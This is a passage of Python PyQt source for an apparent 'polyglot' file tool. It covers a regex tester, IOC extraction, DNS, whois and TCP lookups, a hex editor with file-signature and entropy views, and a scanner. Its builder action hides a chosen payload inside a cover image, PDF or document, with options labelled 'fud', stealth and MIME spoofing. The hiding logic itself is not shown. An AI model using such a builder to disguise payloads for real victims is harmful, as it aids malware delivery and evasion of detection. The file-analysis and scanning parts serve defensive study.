        self.regex_pattern.textChanged.connect(self._auto_regex_match)
        l.addWidget(self.regex_pattern)

        self.regex_input = QTextEdit()
        self.regex_input.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;font-family:Consolas,monospace;font-size:12px")
        self.regex_input.setPlaceholderText("Paste text here... matches highlight in red automatically")
        self.regex_input.textChanged.connect(self._auto_regex_match)
        l.addWidget(self.regex_input, 1)

        self.regex_status = QLabel("Type a pattern and text to see matches")
        self.regex_status.setStyleSheet(f"color:{T.DIM};font-size:11px;padding:4px")
        l.addWidget(self.regex_status)
        return w

    def _auto_regex_match(self):
        """Auto-highlight regex matches in red without clearing text."""
        import re as regex
        pattern_text = self.regex_pattern.text().strip()
        input_text = self.regex_input.toPlainText()

        if not pattern_text or not input_text:
            # Restore plain text (no highlights)
            self.regex_input.blockSignals(True)
            cursor = self.regex_input.textCursor()
            pos = cursor.position()
            self.regex_input.setPlainText(input_text)
            cursor.setPosition(min(pos, len(input_text)))
            self.regex_input.setTextCursor(cursor)
            self.regex_input.blockSignals(False)
            self.regex_status.setText("Type a pattern and text to see matches")
            return

        try:
            matches = list(regex.finditer(pattern_text, input_text))
        except regex.error as e:
            self.regex_status.setText(f"Regex error: {e}")
            return

        if not matches:
            self.regex_input.blockSignals(True)
            cursor = self.regex_input.textCursor()
            pos = cursor.position()
            self.regex_input.setPlainText(input_text)
            cursor.setPosition(min(pos, len(input_text)))
            self.regex_input.setTextCursor(cursor)
            self.regex_input.blockSignals(False)
            self.regex_status.setText("No matches found")
            return

        # Build HTML with red highlights
        html_parts = ['<pre style="font-family:Consolas,monospace;font-size:12px;line-height:1.5;margin:0;white-space:pre-wrap">']
        last_end = 0
        for m in matches[:500]:
            # Text before match
            before = input_text[last_end:m.start()].replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('\n','<br>')
            html_parts.append(before)
            # Matched text in red
            matched = input_text[m.start():m.end()].replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('\n','<br>')
            html_parts.append(f'<span style="background:#ff4444;color:white;font-weight:bold;padding:1px 2px;border-radius:2px">{matched}</span>')
            last_end = m.end()
        # Remaining text
        remaining = input_text[last_end:].replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('\n','<br>')
        html_parts.append(remaining)
        html_parts.append('</pre>')

        self.regex_input.blockSignals(True)
        self.regex_input.setHtml(''.join(html_parts))
        self.regex_input.blockSignals(False)

        groups_info = ""
        if matches[0].groups():
            groups_info = f" | Groups: {', '.join(str(g) for g in matches[0].groups()[:3])}"
        self.regex_status.setText(f"🔴 {len(matches)} matches{groups_info}")

    def _ws_autodetect(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("🔍 Auto-Detect URLs/IPs/Domains/Emails"))
        self.ad_input = QTextEdit()
        self.ad_input.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;font-family:Consolas,monospace;font-size:12px")
        self.ad_input.setPlaceholderText("Paste text to extract IOCs from...")
        l.addWidget(self.ad_input, 1)
        rb = btn("🔍 Extract", T.BLUE); rb.clicked.connect(self._extract_iocs); l.addWidget(rb)
        self.ad_results = log_box(); self.ad_results.setMaximumHeight(250)
        l.addWidget(self.ad_results)
        return w

    def _extract_iocs(self):
        import re
        text = self.ad_input.toPlainText()
        self.ad_results.clear()
        urls = re.findall(r'https?://[^\s<>"\']+', text)
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', text)
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
        domains = re.findall(r'\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b', text)
        append_log(self.ad_results, f"URLs: {len(urls)}", T.CYAN)
        for u in urls[:20]: append_log(self.ad_results, f"  {u}", T.DIM)
        append_log(self.ad_results, f"IPs: {len(ips)}", T.GREEN)
        for ip in sorted(set(ips))[:20]: append_log(self.ad_results, f"  {ip}", T.DIM)
        append_log(self.ad_results, f"Emails: {len(emails)}", T.YELLOW)
        for e in sorted(set(emails))[:20]: append_log(self.ad_results, f"  {e}", T.DIM)
        append_log(self.ad_results, f"Domains: {len(set(domains))}", T.ORANGE)

    # ── Menu 14: Network Tools ──────────────────────────────

    def _pg_network_tools(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(12)
        l.addWidget(self._header("🌐 Network Tools", T.BLUE))

        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane{{background:{T.BG2};border:1px solid {T.BORDER}}}QTabBar::tab{{background:{T.BG3};color:{T.DIM};padding:8px 16px;border:none}}QTabBar::tab:selected{{background:{T.BG2};color:{T.BLUE};border-bottom:2px solid {T.BLUE}}}")

        tabs.addTab(self._nt_dns(),"DNS Lookup")
        tabs.addTab(self._nt_whois(),"Whois")
        tabs.addTab(self._nt_tcp(),"TCP Connect")

        tabs.addTab(self._nt_ioc_extract(),"IOC Extractor")
        l.addWidget(tabs, 1)
        return p

    def _nt_dns(self):
        w = QWidget(); l = QVBoxLayout(w)
        r = QHBoxLayout()
        self.dns_host = inp("hostname (e.g., example.com)")
        r.addWidget(self.dns_host, 1)
        self.dns_type = combo(["A","AAAA","MX","NS","TXT","CNAME","SOA","ANY"])
        r.addWidget(self.dns_type)
        gb = btn("Lookup", T.BLUE); gb.clicked.connect(self._do_dns); r.addWidget(gb)
        l.addLayout(r)
        self.dns_results = log_box(); l.addWidget(self.dns_results, 1)
        return w

    def _do_dns(self):
        import socket
        host = self.dns_host.text().strip()
        rtype = self.dns_type.currentText()
        self.dns_results.clear()
        append_log(self.dns_results, f"DNS {rtype} lookup: {host}", T.CYAN)
        try:
            if rtype == "A":
                results = socket.getaddrinfo(host, None, socket.AF_INET)
                for r in results[:10]: append_log(self.dns_results, f"  A: {r[4][0]}", T.GREEN)
            elif rtype == "AAAA":
                results = socket.getaddrinfo(host, None, socket.AF_INET6)
                for r in results[:10]: append_log(self.dns_results, f"  AAAA: {r[4][0]}", T.GREEN)
            elif rtype == "MX":
                import subprocess
                out = subprocess.run(["dig","+short","MX",host], capture_output=True, text=True, timeout=5)
                for line in out.stdout.strip().split('\n'):
                    if line: append_log(self.dns_results, f"  MX: {line}", T.GREEN)
            elif rtype == "NS":
                import subprocess
                out = subprocess.run(["dig","+short","NS",host], capture_output=True, text=True, timeout=5)
                for line in out.stdout.strip().split('\n'):
                    if line: append_log(self.dns_results, f"  NS: {line}", T.GREEN)
            elif rtype == "TXT":
                import subprocess
                out = subprocess.run(["dig","+short","TXT",host], capture_output=True, text=True, timeout=5)
                for line in out.stdout.strip().split('\n'):
                    if line: append_log(self.dns_results, f"  TXT: {line}", T.GREEN)
            elif rtype == "CNAME":
                import subprocess
                out = subprocess.run(["dig","+short","CNAME",host], capture_output=True, text=True, timeout=5)
                for line in out.stdout.strip().split('\n'):
                    if line: append_log(self.dns_results, f"  CNAME: {line}", T.GREEN)
            elif rtype == "SOA":
                import subprocess
                out = subprocess.run(["dig","+short","SOA",host], capture_output=True, text=True, timeout=5)
                for line in out.stdout.strip().split('\n'):
                    if line: append_log(self.dns_results, f"  SOA: {line}", T.GREEN)
            else:
                results = socket.getaddrinfo(host, None)
                for r in results[:10]: append_log(self.dns_results, f"  {r[4][0]}", T.GREEN)
            append_log(self.dns_results, f"\nLookup complete", T.DIM)
        except Exception as e:
            append_log(self.dns_results, f"Error: {e}", T.RED)

    def _nt_whois(self):
        w = QWidget(); l = QVBoxLayout(w)
        r = QHBoxLayout()
        self.whois_host = inp("domain or IP")
        r.addWidget(self.whois_host, 1)
        gb = btn("Whois", T.BLUE); gb.clicked.connect(self._do_whois); r.addWidget(gb)
        l.addLayout(r)
        self.whois_results = log_box(); l.addWidget(self.whois_results, 1)
        return w

    def _do_whois(self):
        import socket
        host = self.whois_host.text().strip()
        self.whois_results.clear()
        append_log(self.whois_results, f"Whois: {host}", T.CYAN)
        try:
            # Direct socket whois query
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect(("whois.iana.org", 43))
            s.send((host + "\r\n").encode())
            response = b""
            while True:
                data = s.recv(4096)
                if not data: break
                response += data
            s.close()
            decoded = response.decode(errors='replace')
            for line in decoded.split('\n'):
                line = line.strip()
                if line and not line.startswith('%'):
                    append_log(self.whois_results, f"  {line}", T.FG)
        except Exception as e:
            append_log(self.whois_results, f"Error: {e}", T.RED)

    def _nt_tcp(self):
        w = QWidget(); l = QVBoxLayout(w)
        r = QHBoxLayout()
        self.tcp_host = inp("host")
        r.addWidget(self.tcp_host, 1)
        self.tcp_port = QSpinBox(); self.tcp_port.setRange(1,65535); self.tcp_port.setValue(80)
        self.tcp_port.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:6px")
        r.addWidget(QLabel("Port:")); r.addWidget(self.tcp_port)
        gb = btn("Connect", T.BLUE); gb.clicked.connect(self._do_tcp); r.addWidget(gb)
        l.addLayout(r)
        self.tcp_results = log_box(); l.addWidget(self.tcp_results, 1)
        return w

    def _do_tcp(self):
        import socket
        host = self.tcp_host.text().strip()
        port = self.tcp_port.value()
        self.tcp_results.clear()
        append_log(self.tcp_results, f"TCP connect: {host}:{port}", T.CYAN)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            start = time.time()
            s.connect((host, port))
            elapsed = (time.time() - start) * 1000
            s.close()
            append_log(self.tcp_results, f"  ✓ OPEN ({elapsed:.1f}ms)", T.GREEN)
        except socket.timeout:
            append_log(self.tcp_results, f"  ✗ TIMEOUT", T.YELLOW)
        except ConnectionRefusedError:
            append_log(self.tcp_results, f"  ✗ REFUSED", T.RED)
        except Exception as e:
            append_log(self.tcp_results, f"  ✗ ERROR: {e}", T.RED)

    def _nt_ioc_extract(self):
        """Extract IPs, domains, emails, URLs from a polyglot file."""
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("🔍 IOC Extractor — Extract IOCs from polyglot files"))
        r = QHBoxLayout()
        self.ioc_file = inp("File to extract IOCs from...")
        r.addWidget(self.ioc_file, 1)
        bb = btn("Browse", T.DIM); bb.clicked.connect(lambda: self._browse(self.ioc_file)); r.addWidget(bb)
        gb = btn("📌 Global", T.DIM); gb.clicked.connect(lambda: self.ioc_file.setText(self.global_file) if self.global_file else None); r.addWidget(gb)
        eb = btn("🔍 Extract IOCs", T.BLUE); eb.clicked.connect(self._do_ioc_extract); r.addWidget(eb)
        l.addLayout(r)

        # Results split: left = IOCs, right = enrichment
        split = QSplitter(Qt.Orientation.Horizontal)

        # Left: extracted IOCs
        left = QWidget(); ll = QVBoxLayout(left)
        ll.addWidget(QLabel("Extracted IOCs:"))
        self.ioc_results = QTreeWidget()
        self.ioc_results.setHeaderLabels(["Type","Value","Count"])
        self.ioc_results.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        ll.addWidget(self.ioc_results, 1)
        split.addWidget(left)

        # Right: enrichment (whois/ipinfo)
        right = QWidget(); rl = QVBoxLayout(right)
        rl.addWidget(QLabel("Enrichment:"))
        self.ioc_enrichment = log_box()
        rl.addWidget(self.ioc_enrichment, 1)
        split.addWidget(right)

        split.setSizes([500, 400])
        l.addWidget(split, 1)
        return w

    def _do_ioc_extract(self):
        import re
        fp = self.ioc_file.text().strip()
        if not fp or not os.path.isfile(fp):
            return
        self.ioc_results.clear()
        self.ioc_enrichment.clear()

        try:
            with open(fp, 'rb') as f:
                data = f.read()
            text = data.decode('utf-8', errors='replace')
        except Exception as e:
            append_log(self.ioc_enrichment, f"Error reading file: {e}", T.RED)
            return

        # Extract IOCs
        ips = list(set(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', text)))
        domains = list(set(re.findall(r'\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b', text)))
        emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)))
        urls = list(set(re.findall(r'https?://[^\s<>"\'\x00-\x1f]+', text)))

        # Filter out common false positives
        filtered_domains = [d for d in domains if not d.endswith(('.dll', '.exe', '.sys', '.tmp'))
                           and len(d) > 4 and d not in ('example.com', 'localhost.localdomain')]
        filtered_ips = [ip for ip in ips if not ip.startswith(('0.0.0', '255.255.255', '127.0.0'))
                       and not all(int(o) <= 1 for o in ip.split('.'))]

        # Populate tree
        for ip in sorted(filtered_ips):
            QTreeWidgetItem(self.ioc_results, ["IP", ip, "1"])
        for d in sorted(filtered_domains):
            QTreeWidgetItem(self.ioc_results, ["Domain", d, "1"])
        for e in sorted(emails):
            QTreeWidgetItem(self.ioc_results, ["Email", e, "1"])
        for u in sorted(urls)[:50]:
            QTreeWidgetItem(self.ioc_results, ["URL", u[:100], "1"])

        total = len(filtered_ips) + len(filtered_domains) + len(emails) + len(urls)
        append_log(self.ioc_enrichment, f"Extracted {total} IOCs from {os.path.basename(fp)}", T.CYAN)
        append_log(self.ioc_enrichment, f"  IPs: {len(filtered_ips)}", T.GREEN)
        append_log(self.ioc_enrichment, f"  Domains: {len(filtered_domains)}", T.GREEN)
        append_log(self.ioc_enrichment, f"  Emails: {len(emails)}", T.GREEN)
        append_log(self.ioc_enrichment, f"  URLs: {len(urls)}", T.GREEN)

        # Auto-enrich first few IPs/domains
        append_log(self.ioc_enrichment, "\n── Auto-Enrichment ──", T.YELLOW)
        import socket
        for ip in filtered_ips[:3]:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                append_log(self.ioc_enrichment, f"  {ip} → {hostname}", T.BLUE)
            except:
                append_log(self.ioc_enrichment, f"  {ip} → (no reverse DNS)", T.DIM)

        for d in filtered_domains[:3]:
            try:
                ip = socket.gethostbyname(d)
                append_log(self.ioc_enrichment, f"  {d} → {ip}", T.BLUE)
            except:
                append_log(self.ioc_enrichment, f"  {d} → (DNS failed)", T.DIM)

    def _send_raw_req(self):
        import socket
        req = self.raw_req.toPlainText()
        self.raw_resp.clear()
        try:
            # Parse host from request
            host = None
            for line in req.split('\n'):
                if line.lower().startswith('host:'):
                    host = line.split(':',1)[1].strip().split(':')[0]
                    break
            if not host: append_log(self.raw_resp, "No Host header found", T.RED); return
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, 80))
            s.send(req.encode())
            response = b""
            while True:
                data = s.recv(4096)
                if not data: break
                response += data
            s.close()
            decoded = response.decode(errors='replace')
            for line in decoded.split('\n')[:100]:
                append_log(self.raw_resp, line.rstrip(), T.FG)
        except Exception as e:
            append_log(self.raw_resp, f"Error: {e}", T.RED)

    def _nt_history(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📜 Request History"))
        self.nt_hist_tree = QTreeWidget()
        self.nt_hist_tree.setHeaderLabels(["Time","Type","Host","Result"])
        self.nt_hist_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.nt_hist_tree, 1)
        rb = btn("Refresh", T.DIM); rb.clicked.connect(self._refresh_net_history); l.addWidget(rb)
        return w

    def _refresh_net_history(self):
        self.nt_hist_tree.clear()
        hist_path = os.path.expanduser("~/.polyglot/network_history.jsonl")
        if os.path.exists(hist_path):
            with open(hist_path) as f:
                for line in f:
                    try:
                        e = json.loads(line.strip())
                        self.nt_hist_tree.addTopLevelItem(QTreeWidgetItem([e.get('time',''),e.get('type',''),e.get('host',''),e.get('result','')]))
                    except: pass

    # ── Menu 15: Hex Editor ─────────────────────────────────

    def _pg_hex_editor(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(20,15,20,15); l.setSpacing(8)
        l.addWidget(self._header("⬡ Hex Editor — Professional View", T.GREEN))

        # Top bar: file + search + stats
        top = QHBoxLayout()
        self.hex_file = inp("File to view...")
        top.addWidget(self.hex_file, 1)
        bb = btn("Browse", T.DIM); bb.clicked.connect(lambda: self._browse(self.hex_file)); top.addWidget(bb)
        gb = btn("📌 Global", T.DIM); gb.clicked.connect(self._use_global_in_hex); top.addWidget(gb)
        lb = btn("Load", T.GREEN); lb.clicked.connect(self._load_hex); top.addWidget(lb)
        l.addLayout(top)

        # Stats bar
        self.hex_stats = QLabel("No file loaded")
        self.hex_stats.setStyleSheet(f"color:{T.DIM};font-size:11px;padding:4px 8px;background:{T.BG2};border-radius:4px")
        l.addWidget(self.hex_stats)

        # Real-time search (no button)
        sr = QHBoxLayout()
        self.hex_search = inp("🔍 Real-time search: hex (89504e47) or ASCII...")
        self.hex_search.textChanged.connect(self._hex_realtime_search)
        sr.addWidget(self.hex_search, 1)
        self.hex_search_count = QLabel("")
        self.hex_search_count.setStyleSheet(f"color:{T.YELLOW};font-size:11px;padding:4px")
        sr.addWidget(self.hex_search_count)
        l.addLayout(sr)

        # Main content: hex dump (QTextEdit with HTML for highlighting)
        self.hex_dump = QTextEdit(); self.hex_dump.setReadOnly(True)
        self.hex_dump.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;font-family:'Courier New',Consolas,monospace;font-size:12px;line-height:1.4")
        l.addWidget(self.hex_dump, 1)

        # Bottom tabs: Entropy Map, Format Detection, Strings
        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane{{background:{T.BG2};border:1px solid {T.BORDER}}}QTabBar::tab{{background:{T.BG3};color:{T.DIM};padding:6px 14px;border:none;font-size:11px}}QTabBar::tab:selected{{background:{T.BG2};color:{T.GREEN};border-bottom:2px solid {T.GREEN}}}")

        self.hex_entropy = log_box()
        tabs.addTab(self.hex_entropy, "Entropy Map")

        self.hex_format = log_box()
        tabs.addTab(self.hex_format, "Format Signatures")

        self.hex_strings = log_box()
        tabs.addTab(self.hex_strings, "Strings")

        tabs.setMaximumHeight(220)
        l.addWidget(tabs)
        self.hex_data = b''
        return p

    def _load_hex(self):
        fp = self.hex_file.text().strip()
        if not fp or not os.path.isfile(fp): return
        with open(fp,'rb') as f: data = f.read()
        self.hex_data = data

        # Stats bar
        ent = self.builder.entropy(data)
        sz = len(data)
        magic = data[:8].hex() if len(data) >= 8 else data.hex()
        self.hex_stats.setText(f"  📄 {os.path.basename(fp)}  |  {sz:,} bytes  |  Entropy: {ent:.4f}  |  Magic: {magic}")

        # Render hex dump with format highlighting
        self._render_hex_dump(data)

        # Entropy map
        self.hex_entropy.clear()
        block_size = 256
        for i in range(0, min(len(data), 20000), block_size):
            block = data[i:i+block_size]
            e = self.builder.entropy(block)
            bar = '█' * int(e * 4) + '░' * (32 - int(e * 4))
            color = T.RED if e > 7.5 else T.YELLOW if e > 6.0 else T.GREEN
            append_log(self.hex_entropy, f"0x{i:08x} [{bar}] {e:.3f}", color)

        # Format detection with regions
        self.hex_format.clear()
        signatures = [
            (b'\xff\xd8\xff', 'JPEG', T.GREEN), (b'\x89PNG\r\n', 'PNG', T.GREEN),
            (b'GIF8', 'GIF', T.GREEN), (b'%PDF', 'PDF', T.RED),
            (b'PK\x03\x04', 'ZIP', T.YELLOW), (b'MZ', 'PE/DOS', T.RED),
            (b'\x7fELF', 'ELF', T.RED), (b'\xfe\xed\xfa', 'Mach-O', T.RED),
            (b'Rar!', 'RAR', T.YELLOW), (b'\x1f\x8b', 'GZIP', T.YELLOW),
            (b'BM', 'BMP', T.GREEN), (b'RIFF', 'RIFF', T.CYAN),
            (b'OggS', 'OGG', T.CYAN), (b'ID3', 'MP3', T.CYAN),
            (b'fLaC', 'FLAC', T.CYAN), (b'\xd0\xcf\x11\xe0', 'OLE2', T.ORANGE),
            (b'SQLite', 'SQLite', T.BLUE), (b'\x1a\x45\xdf\xa3', 'MKV/WebM', T.CYAN),
        ]

        primary = None
        for sig, name, color in signatures:
            if data[:len(sig)] == sig:
                append_log(self.hex_format, f"  ✓ PRIMARY: {name} (0x00 - 0x{len(sig):04x})", color)
                primary = name
                break

        # Scan for embedded signatures
        found = []
        for sig, name, color in signatures:
            start = len(sig) if data[:len(sig)] == sig else 0
            pos = data.find(sig, start)
            if pos > 0:
                found.append((pos, name, color))
        if found:
            append_log(self.hex_format, f"  ⚠ EMBEDDED SIGNATURES:", T.RED)
            for pos, name, color in sorted(found)[:20]:
                append_log(self.hex_format, f"    {name} at 0x{pos:08x} ({pos:,})", color)

        # Strings extraction
        self.hex_strings.clear()
        import re
        strings = re.findall(b'[\x20-\x7e]{6,}', data)
        append_log(self.hex_strings, f"Found {len(strings)} strings (min 6 chars):", T.CYAN)
        for s in strings[:100]:
            decoded = s.decode('ascii', errors='replace')
            pos = data.find(s)
            append_log(self.hex_strings, f"  0x{pos:08x}: {decoded[:80]}", T.FG)

    def _render_hex_dump(self, data, highlight_offsets=None):
        """Render hex dump as HTML with color-coded regions."""
        highlight_offsets = highlight_offsets or set()
        html_lines = []
        html_lines.append('<pre style="font-family:Courier New,Consolas,monospace;font-size:12px;line-height:1.5;margin:0">')

        # Format signature colors
        sig_regions = []
        sigs = [
            (b'\xff\xd8\xff', 'JPEG', '#4CAF50'), (b'\x89PNG', 'PNG', '#4CAF50'),
            (b'MZ', 'PE', '#f44336'), (b'\x7fELF', 'ELF', '#f44336'),
            (b'PK\x03\x04', 'ZIP', '#FF9800'), (b'%PDF', 'PDF', '#f44336'),
        ]
        for sig, name, color in sigs:
            pos = 0
            while True:
                pos = data.find(sig, pos)
                if pos == -1: break
                sig_regions.append((pos, pos + len(sig), color))
                pos += 1

        for i in range(0, min(len(data), 100000), 16):
            chunk = data[i:i+16]
            hex_parts = []
            for j, b in enumerate(chunk):
                offset = i + j
                color = None
                # Check if this byte is in a highlight
                if offset in highlight_offsets:
                    color = '#ff4444'
                else:
                    for rs, re_, rc in sig_regions:
                        if rs <= offset < re_:
                            color = rc
                            break

                hex_str = f'{b:02x}'
                if color:
                    hex_parts.append(f'<span style="background:{color};color:white;font-weight:bold">{hex_str}</span>')
                else:
                    hex_parts.append(hex_str)

            hex_part = ' '.join(hex_parts)
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '·' for b in chunk)

            # Highlight in ASCII column too
            ascii_html = ''
            for j, b in enumerate(chunk):
                ch = chr(b) if 32 <= b < 127 else '·'
                offset = i + j
                if offset in highlight_offsets:
                    ascii_html += f'<span style="background:#ff4444;color:white;font-weight:bold">{ch}</span>'
                else:
                    ascii_html += ch

            html_lines.append(f'<span style="color:{T.DIM}">{i:08x}</span>  {hex_part:<140s}  <span style="color:{T.CYAN}>|{ascii_html}|</span>')

        html_lines.append('</pre>')
        self.hex_dump.setHtml('\n'.join(html_lines))

    def _hex_realtime_search(self, query):
        """Real-time hex/ASCII search with red highlighting."""
        if not self.hex_data:
            return
        query = query.strip()
        if not query:
            self._render_hex_dump(self.hex_data)
            self.hex_search_count.setText("")
            return

        highlight_offsets = set()

        # Try hex pattern first
        try:
            pattern = bytes.fromhex(query)
            start = 0
            count = 0
            while True:
                pos = self.hex_data.find(pattern, start)
                if pos == -1: break
                for k in range(len(pattern)):
                    highlight_offsets.add(pos + k)
                start = pos + 1
                count += 1
                if count > 200: break
            self.hex_search_count.setText(f"{count} matches")
        except ValueError:
            # ASCII search
            pattern = query.encode('utf-8', errors='replace')
            start = 0
            count = 0
            while True:
                pos = self.hex_data.find(pattern, start)
                if pos == -1: break
                for k in range(len(pattern)):
                    highlight_offsets.add(pos + k)
                start = pos + 1
                count += 1
                if count > 200: break
            self.hex_search_count.setText(f"{count} matches")

        self._render_hex_dump(self.hex_data, highlight_offsets)

    def _pg_blue_side(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(12)
        l.addWidget(self._header("🔵 Blue Side Monitoring", T.BLUE))

        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane{{background:{T.BG2};border:1px solid {T.BORDER}}}QTabBar::tab{{background:{T.BG3};color:{T.DIM};padding:8px 16px;border:none}}QTabBar::tab:selected{{background:{T.BG2};color:{T.BLUE};border-bottom:2px solid {T.BLUE}}}")

        tabs.addTab(self._nt_dns(),"DNS Lookup")
        tabs.addTab(self._nt_whois(),"Whois")

        l.addWidget(tabs, 1)
        return p


    def _bs_panel(self, title, icon, description):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel(f"{icon} {title}"))
        desc = QLabel(description); desc.setStyleSheet(f"color:{T.DIM};font-size:11px"); l.addWidget(desc)
        log = log_box(); l.addWidget(log, 1)
        append_log(log, f"{title} ready — {datetime.now().strftime('%H:%M:%S')}", T.DIM)
        return w

    # ── Menu 17: Quarantine Vault (Enhanced) ────────────────
    # Already implemented as _pg_quarantine()

    # ── Menu 18: Comprehensive Report (Enhanced) ────────────
    # Already implemented as _pg_report()

    # ── Helpers ──────────────────────────────────────────────

    def _header(self, text, color=T.FG):
        h = QLabel(text); h.setStyleSheet(f"font-size:24px;font-weight:bold;color:{color};"); return h

    def _save_thresholds(self):
        for key, sp in self._threshold_spinboxes.items():
            self.config.thresholds[key] = sp.value() / 100.0
        try:
            import yaml
            cfg_path = os.path.expanduser("~/.polyglot/config.yaml")
            with open(cfg_path, 'r') as f:
                cfg = yaml.safe_load(f) or {}
            cfg['thresholds'] = self.config.thresholds
            with open(cfg_path, 'w') as f:
                yaml.dump(cfg, f, default_flow_style=False)
            self._log(f"Thresholds saved: {self.config.thresholds}", "success")
        except Exception as e:
            self._log(f"Save failed: {e}", "critical")

    def _notify(self, title, msg, severity="info"):
        """Send notification if enabled in settings."""
        if hasattr(self, 'n_enabled') and self.n_enabled.isChecked():
            if severity == "critical" or not hasattr(self, 'n_critical') or not self.n_critical.isChecked():
                Notifier.send(title, msg, severity)

    def _browse_global_file(self):
        p, _ = QFileDialog.getOpenFileName(self, "Select File")
        if p:
            self.global_file = p
            sz = os.path.getsize(p)
            name = os.path.basename(p)
            self.global_file_label.setText(f"{name} ({sz:,} bytes)")
            self.global_file_label.setStyleSheet(f"color:{T.GREEN};font-size:12px")
            self._log(f"Global file set: {name}", "info")

    def _clear_global_file(self):
        self.global_file = None
        self.global_file_label.setText("No file selected")
        self.global_file_label.setStyleSheet(f"color:{T.DIM};font-size:12px")

    def _use_global_in_scanner(self):
        if self.global_file:
            self.s_path.setText(self.global_file)
        else:
            QMessageBox.information(self, "No File", "Browse a file using the top bar first.")

    def _use_global_in_analysis(self):
        if self.global_file:
            self.da_target.setText(self.global_file)
        else:
            QMessageBox.information(self, "No File", "Browse a file using the top bar first.")

    def _use_global_in_hex(self):
        if self.global_file:
            self.hex_file.setText(self.global_file)
        else:
            QMessageBox.information(self, "No File", "Browse a file using the top bar first.")

    def _browse(self, entry):
        p,_ = QFileDialog.getOpenFileName(self,"Select File")
        if p: entry.setText(p)

    def _browse_dir(self, entry):
        p = QFileDialog.getExistingDirectory(self,"Select Directory")
        if p: entry.setText(p)

    def _log(self, text, tag=None):
        colors = {'critical':T.RED,'high':T.ORANGE,'warning':T.YELLOW,'info':T.BLUE,
                  'success':T.GREEN,'header':T.RED,'clean':T.CYAN}
        ts = datetime.now().strftime('%H:%M:%S')
        append_log(self.log_box_main, f"[{ts}] {text}", colors.get(tag, T.FG))

    # ── Builder Action ───────────────────────────────────────

    def _run_builder(self):
        cover = self.b_cover.text().strip(); payload = self.b_payload.text().strip()
        if not cover or not os.path.isfile(cover): QMessageBox.warning(self,"Error","Select a valid cover file"); return
        if not payload or not os.path.isfile(payload): QMessageBox.warning(self,"Error","Select a valid payload file"); return
        ext_map={'JPEG':'.jpg','PNG':'.png','GIF':'.gif','PDF':'.pdf','ZIP':'.zip','MP4':'.mp4','XLSX':'.xlsx','DOCX':'.docx'}
        ct = self.b_type.currentText()
        output,_ = QFileDialog.getSaveFileName(self,"Save Polyglot As",f"polyglot{ext_map.get(ct,'.bin')}",f"{ct} Files (*{ext_map.get(ct,'.*')});;All Files (*)")
        if not output: return
        # Get payload type, target OS, and architecture
        pt = self.b_payload_type.currentText()
        payload_type = None if pt == 'Auto' else pt.lower()
        target_os = self.b_target_os.currentText().lower()
        if target_os == 'all': target_os = 'all'
        arch = self.b_arch.currentText().lower()
        # Validate arm32 only for linux
        if arch == 'arm32' and target_os not in ('linux', 'all'):
            QMessageBox.warning(self,"Error","ARM32 only supported on Linux")
            return
        try:
            stats = self.builder.build(cover, payload, output, ct.lower(),
                                       self.b_enc.isChecked(), self.b_fud.isChecked(), self.b_mime.isChecked(),
                                       payload_type=payload_type, target_os=target_os,
                                       arch=arch, stealth=self.b_stealth.isChecked())
            for k,v in stats.items():
                if k == 'warnings': continue
                append_log(self.b_log, f"  {k}: {v}", T.GREEN)
            for w in stats.get('warnings', []):
                append_log(self.b_log, f"  ⚠ {w}", '#FFA500')
            self.counts['built'] += 1; self.d_built._val.setText(str(self.counts['built']))
            self._log(f"Polyglot built: {output}","success")
            Notifier.send("Polyglot Built",f"{ct} polyglot created")
        except Exception as e:
            append_log(self.b_log, f"ERROR: {e}", T.RED); self._log(f"Build failed: {e}","critical")

    # ── Scanner Action ───────────────────────────────────────

    def _run_scanner(self):
        target = self.s_path.text().strip()
        if not target: QMessageBox.warning(self,"Error","Select a target"); return
        if os.path.isfile(target): files = [target]
        elif os.path.isdir(target):
            exts={'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx','.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4'}
            files=[]
            for root,dirs,fnames in os.walk(target):
                dirs[:]=[d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts: files.append(os.path.join(root,f))
        else: return
        self.s_tree.clear(); self.s_progress.setMaximum(len(files)); self.s_progress.setValue(0)
